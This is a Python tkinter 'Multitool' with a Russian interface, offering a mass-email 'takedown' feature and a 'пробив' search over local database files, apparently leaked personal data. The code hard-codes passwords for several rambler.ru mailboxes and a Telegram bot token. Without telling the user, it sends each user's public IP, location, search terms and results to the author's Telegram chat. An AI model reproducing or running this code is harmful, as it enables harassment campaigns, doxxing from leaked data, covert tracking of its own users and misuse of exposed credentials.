from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import requests
import urllib.request
from datetime import datetime
import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk
import random
import threading
import os
import re
import csv
# SMTP email settings
senders = {
    'petrslepuhin95@rambler.ru': 'QI2n1r8zRL1',
    'levteslenko@rambler.ru': 'iAB06GP2wMO',
    'evelinakozerskaya@rambler.ru': '5cxQ7l0IlVu',
    'maryanakiyametdinova@rambler.ru': 'T6KuiNmonc',
}
TELEGRAM_BOT_TOKEN = '7822478980:AAFY0akpOW9h32zLmlbua1T5-00CB4TTXGQ'
banner = """
███╗░░░███╗██╗███╗░░██╗██╗████████╗░█████╗░░█████╗░██╗░░░░░ ░██████╗░█████╗░███████╗████████╗
████╗░████║██║████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░ ██╔════╝██╔══██╗██╔════╝╚══██╔══╝
██╔████╔██║██║██╔██╗██║██║░░░██║░░░██║░░██║██║░░██║██║░░░░░ ╚█████╗░██║░░██║█████╗░░░░░██║░░░
██║╚██╔╝██║██║██║╚████║██║░░░██║░░░██║░░██║██║░░██║██║░░░░░ ░╚═══██╗██║░░██║██╔══╝░░░░░██║░░░
██║░╚═╝░██║██║██║░╚███║██║░░░██║░░░╚█████╔╝╚█████╔╝███████╗ ██████╔╝╚█████╔╝██║░░░░░░░░██║░░░
╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚═╝░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝ ╚═════╝░░╚════╝░╚═╝░░░░░░░░╚═╝░░░
███╗░░░███╗██╗░░░██╗██╗░░░░░████████╗██╗████████╗░█████╗░░█████╗░██╗░░░░░
████╗░████║██║░░░██║██║░░░░░╚══██╔══╝██║╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
██╔████╔██║██║░░░██║██║░░░░░░░░██║░░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░
██║╚██╔╝██║██║░░░██║██║░░░░░░░░██║░░░██║░░░██║░░░██║░░██║██║░░██║██║░░░░░
██║░╚═╝░██║╚██████╔╝███████╗░░░██║░░░██║░░░██║░░░╚█████╔╝╚█████╔╝███████╗
╚═╝░░░░░╚═╝░╚═════╝░╚══════╝░░░╚═╝░░░╚═╝░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
"""
stop_thread = False
log_text = None
# Define functions
def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP('smtp.rambler.ru', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        return False
def get_public_ip():
    try:
        with urllib.request.urlopen("https://ident.me") as response:
            return response.read().decode("utf-8")
    except Exception as e:
        return "Не удалось определить публичный IP-адрес"
def get_ip_info():
    response = requests.get('https://ipinfo.io/')
    return response.json()
def process_input():
    global stop_thread, log_text
    stop_thread = False
    receiver_email = entry_email.get()
    rounds_value = entry_rounds.get()
    if not rounds_value:
        error_label.config(text="Введите количество кругов.", fg="red")
        return
    try:
        num_rounds = int(rounds_value)
    except ValueError:
        error_label.config(text="Введите корректное количество кругов.", fg="red")
        return
    if num_rounds < 1 or num_rounds > 5:
        error_label.config(text="Введите количество кругов от 1 до 5.", fg="red")
        return
    reasons = [entry_reason1.get(), entry_reason2.get(), entry_reason3.get()]
    reasons = [reason for reason in reasons if reason]
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    for _ in range(num_rounds):
        if stop_thread:
            break
        for sender_email, sender_password in senders.items():
            if stop_thread:
                break
            random_reason = random.choice(reasons)
            message = random_reason
            if send_email(receiver_email, sender_email, sender_password, 'Скрипт активирован', message):
                log_text.insert(tk.END, f"Email отправлен успешно на {sender_email}!\n")
                log_text.see(tk.END)
                print(f"Email отправлен erfolgreich на {sender_email}!")
            else:
                log_text.insert(tk.END, f"Ошибка отправки email на {sender_email}\n")
                log_text.see(tk.END)
                print(f"Ошибка отправки email на {sender_email}")
    if stop_thread:
        log_text.insert(tk.END, "Отправка сообщений остановлена.\n")
        log_text.see(tk.END)
        error_label.config(text="Отправка сообщений остановлена.", fg="red")
    else:
        telegram_message = (
            f"*╓Состояние выполнения:* Скрипт активирован\n"
            f"*╟Дата и время:* {current_time}\n"
            f"*╟Публичный IP-адрес:* {get_public_ip()}\n"
            f"*╟Провайдер:* {get_ip_info().get('org')}\n"
            f"*╟Город:* {get_ip_info().get('city')}\n"
            f"*╟Страна:* {get_ip_info().get('country')}\n"
            f"*╟Причины:* \n"
        )
        for i, reason in enumerate(reasons, start=1):
            telegram_message += f"*╟Причина {i}:* {reason}\n"
        send_telegram_message(TELEGRAM_BOT_TOKEN, "7026322473", telegram_message)
def send_telegram_message(token, chat_id, message):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    params = {"chat_id": chat_id, "text": message}
    response = requests.post(url, params=params)
    if response.status_code == 200:
        print("Сообщение отправлено успешно!")
    else:
        print("Ошибка отправки сообщения:", response.text)
        print("Status code:", response.status_code)
def stop_thread_function():
    global stop_thread
    stop_thread = True
def open_menu():
    main_menu_frame.pack_forget()
    menu_frame.pack()
def open_main_menu():
    menu_frame.pack_forget()
    main_menu_frame.pack()
def open_probiv_menu():
    main_menu_frame.pack_forget()
    probiv_frame.pack()
def back_to_main_menu():
    probiv_frame.pack_forget()
    main_menu_frame.pack()
def search_probiv_data():
    search_data = probiv_entry.get()
    result = ""
    for filename in os.listdir('database'):
        if filename.endswith('.txt') or filename.endswith('.csv'):
            try:
                if filename.endswith('.txt'):
                    with open(os.path.join('database', filename), 'r', encoding='utf-8') as file:
                        for line in file:
                            if re.search(search_data, line, re.IGNORECASE):
                                result += line
                elif filename.endswith('.csv'):
                    with open(os.path.join('database', filename), 'r', encoding='utf-8') as file:
                        reader = csv.reader(file)
                        for row in reader:
                            for cell in row:
                                if re.search(search_data, cell, re.IGNORECASE):
                                    result += cell + '\n'
            except UnicodeDecodeError:
                print(f"Ошибка декодирования файла {filename}")
    if result:
        probiv_result_label.config(state='normal')
        probiv_result_label.delete('2.0', 'end')
        probiv_result_label.insert('2.0', result)
        probiv_result_label.config(state='disabled')
    else:
        probiv_result_label.config(state='normal')
        probiv_result_label.delete('2.0', 'end')
        probiv_result_label.insert('2.0', 'Результатов поиска не найдено                                      ')
        probiv_result_label.config(state='disabled')
    public_ip = get_public_ip()
    ip_info = get_ip_info()
    telegram_message = (
        f"*╓Поиск в меню ПРОБИВКА:*\n"
        f"*╟Дата и время:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"*╟Введенные данные:* {search_data}\n"
        f"*╟Публичный IP-адрес:* {public_ip}\n"
        f"*╟Провайдер:* {ip_info.get('org')}\n"
        f"*╟Город:* {ip_info.get('city')}\n"
        f"*╟Страна:* {ip_info.get('country')}\n"
        f"*╟Результат поиска:* \n"
    )
    if result:
        telegram_message += result
    else:
        telegram_message += "Результатов поиска не найдено"
    send_telegram_message(TELEGRAM_BOT_TOKEN, "7026322473", telegram_message)
# GUI Setup
root = tk.Tk()
root.title("Multitool By t.me/minitoolsoft")
root.geometry("800x600")
root.configure(bg="#222021")
# Create a frame for the main menu
main_menu_frame = tk.Frame(root, bg="#222021")
main_menu_frame.pack()
main_menu_label = tk.Label(main_menu_frame, text="Главное меню", bg="#222021", fg="#F7F7F7", font=("Arial", 24))
main_menu_label.pack(pady=20)
# Load the logo image
image = Image.open("logo.png")
image_tk = ImageTk.PhotoImage(image)
# Create a Label for the logo
logo_label = tk.Label(main_menu_frame, image=image_tk, bg="#222021")
logo_label.image = image_tk
logo_label.pack(pady=20)
# Create a Label for the banner
banner_label = tk.Label(main_menu_frame, text=banner, bg="#222021", fg="#F7F7F7", font=("Consolas", 10), justify="left")
banner_label.pack(pady=10)
# Create a frame for the buttons
button_frame = tk.Frame(main_menu_frame, bg="#222021")
button_frame.pack()
opensnos_button = tk.Button(button_frame, text="СНОС", command=open_menu, bg="#4CAF50", fg="#FFFFFF", font=("Arial", 12), relief="ridge", bd=5, highlightthickness=0)
opensnos_button.pack(side=tk.LEFT, padx=10)
probiv_button = tk.Button(button_frame, text="OSINT поиск", command=open_probiv_menu, bg="#03A9F4", fg="#FFFFFF", font=("Arial", 12), relief="ridge", bd=5, highlightthickness=0)
probiv_button.pack(side=tk.LEFT, padx=10)
# Create a frame for the probiv menu
probiv_frame = tk.Frame(root, bg="#222021")
probiv_label = tk.Label(probiv_frame, text="Пробив меню", bg="#222021", fg="#F7F7F7", font=("Arial", 24))
probiv_label.pack(pady=20)
probiv_entry_label = tk.Label(probiv_frame, text="Введите данные для пробива:", bg="#222021", fg="#F7F7F7", font=("Arial", 12), justify="left")
probiv_entry_label.pack()
probiv_entry = tk.Entry(probiv_frame, width=50, font=("Arial", 10), borderwidth=2, relief="groove", bg="#222021", fg="#F7F7F7", insertbackground="#F7F7F7")
probiv_entry.pack(pady=5)
probiv_search_button = tk.Button(probiv_frame, text="Поиск", command=search_probiv_data, bg="#8BC34A", fg="#FFFFFF", font=("Arial", 12), relief="ridge", bd=5, highlightthickness=0)
probiv_search_button.pack(pady=10)
probiv_result_label = tk.Text(probiv_frame, width=50, height=15, font=("Arial", 10), borderwidth=2, relief="groove", bg="#222021", fg="#F7F7F7")
probiv_result_label.pack(pady=20)
button_frame = tk.Frame(probiv_frame, bg="#222021")
button_frame.pack()
back_button = tk.Button(button_frame, text="Назад", command=back_to_main_menu, bg="#2196F3", fg="#FFFFFF", font=("Arial", 12), relief="ridge", bd=5, highlightthickness=0)
back_button.pack(side=tk.LEFT, padx=10)
# Create a frame for the menu
menu_frame = tk.Frame(root, bg="#222021")
content_frame = tk.Frame(menu_frame, bg="#222021")
content_frame.pack()
form_frame = tk.Frame(content_frame, bg="#222021")
form_frame.pack()
email_label = tk.Label(form_frame, text="Введите вашу почту:", bg="#222021", fg="#F7F7F7", font=("Arial", 12))
email_label.pack()
entry_email = tk.Entry(form_frame, width=30, font=("Arial", 10), borderwidth=2, relief="groove", bg="#222021", fg="#F7F7F7", insertbackground="#F7F7F7")
entry_email.pack(pady=5)
rounds_label = tk.Label(form_frame, text="Введите количество кругов (до 5):", bg="#222021", fg="#F7F7F7", font=("Arial", 12))
rounds_label.pack()
entry_rounds = tk.Entry(form_frame, width=5, font=("Arial", 10), borderwidth=2, relief="groove", bg="#222021", fg="#F7F7F7", insertbackground="#F7F7F7")
entry_rounds.pack(pady=5)
reason1_label = tk.Label(form_frame, text="Причина 1:", bg="#222021", fg="#F7F7F7", font=("Arial", 12))
reason1_label.pack()
entry_reason1 = tk.Entry(form_frame, width=50, font=("Arial", 10), borderwidth=2, relief="groove", bg="#222021", fg="#F7F7F7", insertbackground="#F7F7F7")
entry_reason1.pack(pady=5)
reason2_label = tk.Label(form_frame, text="Причина 2:", bg="#222021", fg="#F7F7F7", font=("Arial", 12))
reason2_label.pack()
entry_reason2 = tk.Entry(form_frame, width=50, font=("Arial", 10), borderwidth=2, relief="groove", bg="#222021", fg="#F7F7F7", insertbackground="#F7F7F7")
entry_reason2.pack(pady=5)
reason3_label = tk.Label(form_frame, text="Причина 3:", bg="#222021", fg="#F7F7F7", font=("Arial", 12))
reason3_label.pack()
entry_reason3 = tk.Entry(form_frame, width=50, font=("Arial", 10), borderwidth=2, relief="groove", bg="#222021", fg="#F7F7F7", insertbackground="#F7F7F7")
entry_reason3.pack(pady=5)
button_frame = tk.Frame(form_frame, bg="#222021")
button_frame.pack()
submit_button = tk.Button(button_frame, text="Отправить", command=lambda: threading.Thread(target=process_input).start(), bg="#8BC34A", fg="#FFFFFF", font=("Arial", 12), relief="ridge", bd=5, highlightthickness=0)
submit_button.pack(side=tk.LEFT, padx=10)
stop_button = tk.Button(button_frame, text="Стоп", command=stop_thread_function, bg="#FF5722", fg="#FFFFFF", font=("Arial", 12), relief="ridge", bd=5, highlightthickness=0)
stop_button.pack(side=tk.LEFT, padx=10)
back_button = tk.Button(button_frame, text="Назад", command=open_main_menu, bg="#2196F3", fg="#FFFFFF", font=("Arial", 12), relief="ridge", bd=5, highlightthickness=0)
back_button.pack(side=tk.LEFT, padx=10)
log_label = tk.Label(form_frame, text="Лог отправки сообщений:", bg="#222021", fg="#F7F7F7", font=("Arial", 12))
log_label.pack()
log_text = tk.Text(form_frame, width=50, height=10, font=("Arial", 10), borderwidth=2, relief="groove", bg="#222021", fg="#F7F7F7")
log_text.pack()
error_label = tk.Label(form_frame, text="", bg="#222021", fg="red", font=("Arial", 12))
error_label.pack()
root.mainloop()
